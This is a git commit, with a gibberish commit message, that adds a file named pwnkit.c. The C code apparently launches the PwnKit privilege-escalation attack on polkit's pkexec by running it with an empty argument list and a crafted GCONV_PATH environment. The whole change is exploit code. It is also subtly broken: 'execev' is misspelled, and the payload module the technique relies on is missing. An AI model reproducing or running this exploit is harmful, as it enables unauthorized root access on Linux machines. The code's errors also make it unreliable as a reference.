ba4ddc8c6df6c909fb54e23c7bd56b91d8f2ee3c
Hardwaregore <hardwaregore101@gmail.com>
2022-04-20 11:22:10 -0500

    akwfhuawghjkaegh jaief bew

--- pwnkit.c
+++ pwnkit.c
@@ -1,2 +1,17 @@
 #include <unistd.h>
 
+int main() {
+    char *argv[] = {NULL};
+    char *envp[] = {
+        "pwn",
+        "TERM=..",
+        "PATH=GCONV_PATH=.",
+        "CHARSET=FUCKYOU",
+        NULL};
+
+    execev("/usr/bin/pkexec", argv, envp);
+    return 0;
+}
+
+
+
